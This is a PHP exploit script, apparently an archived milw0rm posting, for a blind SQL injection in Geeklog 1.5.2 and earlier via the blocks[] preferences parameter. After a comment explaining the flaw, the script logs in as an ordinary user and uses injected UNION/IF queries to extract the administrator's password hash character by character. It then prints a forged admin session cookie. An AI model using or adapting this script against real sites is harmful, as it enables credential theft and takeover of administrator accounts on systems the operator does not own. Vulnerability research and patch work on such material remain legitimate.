<?php
    /*
    Geeklog <= 1.5.2 savepreferences()/*blocks[] remote sql injection exploit
    by Nine:Situations:Group::bookoo
     
    our site: http://retrogod.altervista.org/
    software site: http://www.geeklog.net/
     
    PHP and MySQL version independent
     
    vulnerability, see usersettings.php near lines 1467 - 1480:
     
    ...
    if (isset ($_USER['uid']) && ($_USER['uid'] > 1)) {
    switch ($mode) {
    case 'saveuser':
    savepreferences ($_POST);
    $display .= saveuser($_POST);
    PLG_profileExtrasSave ();
    break;
     
    case 'savepreferences':
     
    savepreferences ($_POST);
    $display .= COM_refresh ($_CONF['site_url']
    . '/usersettings.php?mode=preferences&amp;msg=6');
    break;
    ...
     
    all the $_POST[] variables are passed to the savepreferences() function
    now look the function always in usersettings.php:
     
    ...
    function savepreferences($A) {
    global $_CONF, $_TABLES, $_USER;
     
    if (isset ($A['noicons']) && ($A['noicons'] == 'on')) {
    $A['noicons'] = 1;
    } else {
    $A['noicons'] = 0;
    }
    if (isset ($A['willing']) && ($A['willing'] == 'on')) {
    $A['willing'] = 1;
    } else {
    $A['willing'] = 0;
    }
    if (isset ($A['noboxes']) && ($A['noboxes'] == 'on')) {
    $A['noboxes'] = 1;
    } else {
    $A['noboxes'] = 0;
    }
    if (isset ($A['emailfromadmin']) && ($A['emailfromadmin'] == 'on')) {
    $A['emailfromadmin'] = 1;
    } else {
    $A['emailfromadmin'] = 0;
    }
    if (isset ($A['emailfromuser']) && ($A['emailfromuser'] == 'on')) {
    $A['emailfromuser'] = 1;
    } else {
    $A['emailfromuser'] = 0;
    }
    if (isset ($A['showonline']) && ($A['showonline'] == 'on')) {
    $A['showonline'] = 1;
    } else {
    $A['showonline'] = 0;
    }
     
    $A['maxstories'] = COM_applyFilter ($A['maxstories'], true);
    if (empty ($A['maxstories'])) {
    $A['maxstories'] = 0;
    } else if ($A['maxstories'] > 0) {
    if ($A['maxstories'] < $_CONF['minnews']) {
    $A['maxstories'] = $_CONF['minnews'];
    }
    }
     
    $TIDS  = @array_values($A[$_TABLES['topics']]);
    $AIDS  = @array_values($A['selauthors']);
    $BOXES = @array_values($A["{$_TABLES['blocks']}"]); //<--------- this is $_POST[(prefix)blocks]
    $ETIDS = @array_values($A['etids']);
     
    $tids = '';
    if (sizeof ($TIDS) > 0) {
    $tids = addslashes (implode (' ', $TIDS));
    }
     
    $aids = '';
    if (sizeof ($AIDS) > 0) {
    $aids = addslashes (implode (' ', $AIDS));
    }
     
    $selectedblocks = '';
    if (count ($BOXES) > 0) {
    $boxes = addslashes (implode (',', $BOXES)); //<---------- this addslashes() is totally unuseful
     
    //**** SQL INJECTION HERE *** $boxes is not surrounded by quotes!
    $blockresult = DB_query("SELECT bid,name FROM {$_TABLES['blocks']} WHERE bid NOT IN ($boxes)");
     
    $numRows = DB_numRows($blockresult);
    for ($x = 1; $x <= $numRows; $x++) {
    $row = DB_fetchArray ($blockresult);
    if ($row['name'] <> 'user_block' AND $row['name'] <> 'admin_block' AND $row['name'] <> 'section_block') {
    $selectedblocks .= $row['bid'];
    if ($x <> $numRows) {
    $selectedblocks .= ' ';
    }
    }
    }
    }
    ...
     
    read the lines commented!
     
    This tool extracts the admin hash from db by asking true/false questions
    to MySQL and interpreting some checkboxes in response, but requires a simple user account.
     
    vulnerability ii, information disclosure:
    now I see that table prefix is showed inside html because they used table names for the $_TABLES[] array
    */
     
    $err[0] = "[!] This script is intended to be launched from the cli!";
    $err[1] = "[!] You need the curl extesion loaded!";
     
    if (php_sapi_name() <> "cli") {
        die($err[0]);
    }
    if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl("php_curl.dll") ? die($err[1]) :
            nil;
        } else {
            !dl("php_curl.so") ? die($err[1]) :
            nil;
        }
    }
     
    function syntax() {
        print (
        "Syntax: php ".$argv[0]." [host] [path] [user] [pass] [OPTIONS]         \n". "Options:                                                               \n". "--c:[uid:hash    ]  - use your user cookie, instead of uses/pwd pair   \n". "--port:[port]       - specify a port                                   \n". "                      default->80                                      \n". "--uid:[n]           - specify an uid other than default (2,usually admin)\n". "--proxy:[host:port] - use proxy                                          \n". "--skiptest          - skip preliminary tests                             \n". "--test              - run only tests                                     \n". "Examples:   php ".$argv[0]." 192.168.0.1 /geeklog/ bookoo pass          \n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass --proxy:1.1.1.1:8080\n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass --uid:3             \n". "            php ".$argv[0]." 192.168.0.1 /geeklog/ * * -c:3:5f4dcc3b5aa765d61d8327deb882cf99");
        die();
    }
     
    error_reporting(E_ALL ^ E_NOTICE);
    $host = $argv[1];
    $path = $argv[2];
    $_user = $argv[3];
    $_pwd = $argv[4];
     
    //default
    $uid = "2";
    $where = "uid=$uid"; //user id, usually admin, anonymous = 1
     
     
    $argv[4] ? print("[*] Attacking...\n") :
    syntax();
     
    $_use_proxy = false;
    $port = 80;
    $_skiptest = false;
    $_test = false;
    $_use_ck = false;
     
     
    for ($i = 3; $i < $argc; $i++) {
         
        if (stristr($argv[$i], "--proxy:")) {
            $_use_proxy = true;
            $tmp = explode(":", $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], "--port:")) {
            $tmp = explode(":", $argv[$i]);
            $port = (int)$tmp[1];
        }
         
        if (stristr($argv[$i], "--uid")) {
            $tmp = explode(":", $argv[$i]);
            $uid = (int)$tmp[1];
            $where = "uid=$uid";
        }
        if (stristr($argv[$i], "--skiptest")) {
            $_skiptest = true;
        }
        if (stristr($argv[$i], "--test")) {
            $_test = true;
        }
        if (stristr($argv[$i], "--c")) {
            $_use_ck = true;
            $tmp = explode(":", $argv[$i]);
            $tmp[1] = (int)$tmp[1];
            $cookies = "geeklog=".$tmp[1]."; password=".$tmp[2].";";
             
        }
    }
     
    function _s($url, $ck, $is_post, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7");
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $cookies = array("Cookie: ".$ck);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cookies);
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die("[!] ".curl_error($ch)."\n");
        } else {
            curl_close($ch);
        }
        return $_d;
    }
     
    function chk_err($s) {
        if (stripos ($s, "\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64")) {
            return true;
        } else {
            return false;
        }
    }
     
    function run_test() {
        global $host, $port, $path, $cookies, $url, $prefix;
        $_sql = ")";
        $out = _s($url, $cookies, 1, "mode=savepreferences&".$prefix."blocks[0]=".urlencode($_sql)."&");
        if (chk_err($out)) {
            print("[*] Vulnerable!\n");
        } else {
            die ("[!] Not vulnerable ...");
        }
    }
     
    function login() {
        global $host, $port, $path, $_user, $_pwd;
        $url = "http://$host:$port".$path."users.php";
        $out = _s($url, "", 1, "loginname=$_user&passwd=$_pwd&submit=Login");
        $tmp = explode("\x0d\x0a\x0d\x0a", $out);
        $tmp = explode("\x53\x65\x74\x2d\x43\x6f\x6f\x6b\x69\x65\x3a\x20", $tmp[0]);
        $cookies = "";
        for ($i = 1; $i < count($tmp); $i++) {
            $tmp_i = explode(";", $tmp[$i]);
            $cookies .= $tmp_i[0]."; ";
        }
        if (stripos ($cookies, "\x70\x61\x73\x73\x77\x6f\x72\x64")) {
            return $cookies;
        } else {
            die("[*] Unable to login!");
        }
         
    }
     
    function xtrct_prefix() {
        global $host, $port, $path, $cookies, $url;
        $out = _s($url, $cookies, 0, "");
        $tmp = explode("\x62\x6c\x6f\x63\x6b\x73\x5b\x5d", $out);
        if (count($tmp) < 2) {
            die("[!] Not logged in!");
        }
        $tmp = explode("\x22", $tmp[0]);
        $prefix = $tmp[count($tmp)-1];
        return $prefix;
    }
     
    function is_checked() {
        global $host, $port, $path, $cookies, $url;
        $out = _s($url, $cookies, 0, "");
        $tmp = explode("\x62\x6c\x6f\x63\x6b\x73\x5b\x5d", $out);
        $tmp = explode("\x3e", $tmp[1]);
        $s = $tmp[0];
        if (stripos ($s, "\x22\x63\x68\x65\x63\x6b\x65\x64\x22")) {
            return 1;
        } else {
            return 0;
        }
    }
     
    if (!$_use_ck) {
        $cookies = login();
    }
     
    $url = "http://$host:$port".$path."usersettings.php";
    $prefix = xtrct_prefix();
    print "[*] prefix->'".$prefix."'\n";
     
    if (!$_skiptest) {
        run_test();
    }
    if ($_test) {
        die;
    }
     
    #uncheck all boxes
    $rst_sql = "0) AND 0 UNION SELECT 1,0x61646d696e5f626c6f636b FROM ".$prefix."users WHERE ".$where." LIMIT 1/*";
    $out = _s($url, $cookies, 1, "mode=savepreferences&".$prefix."blocks[0]=".urlencode($rst_sql)."&");
    #then start extraction
    $c = array();
    $c = array_merge($c, range(0x30, 0x39));
    $c = array_merge($c, range(0x61, 0x66));
    $url = "http://$host:$port".$path;
    $_hash = "";
    print ("[*] Initiating hash extraction ...\n");
    for ($j = 1; $j < 0x21; $j++) {
        for ($i = 0; $i <= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                $sql = "0) AND 0 UNION SELECT 1,IF(ASCII(SUBSTR(passwd FROM $j FOR 1))=$i,1,0x61646d696e5f626c6f636b) FROM ".$prefix."users WHERE ".$where." LIMIT 1/*";
                $url = "http://$host:$port".$path."usersettings.php";
                $out = _s($url, $cookies, 1, "mode=savepreferences&".$prefix."blocks[0]=".urlencode($sql)."&");
                if (is_checked()) {
                    $f = true;
                    $_hash .= chr($i);
                    print "[*] Md5 Hash: ".$_hash.str_repeat("?", 0x20-$j)."\n";
                    #if found , uncheck again
                    $out = _s($url, $cookies, 1, "mode=savepreferences&".$prefix."blocks[0]=".urlencode($rst_sql)."&");
                    break;
                }
            }
        }
        if ($f == false) {
            die("\n[!] Unknown error ...");
        }
    }
    print "[*] Done! Cookie: geeklog=$uid; password=".$_hash.";\n";
?>

# milw0rm.com [2009-04-16]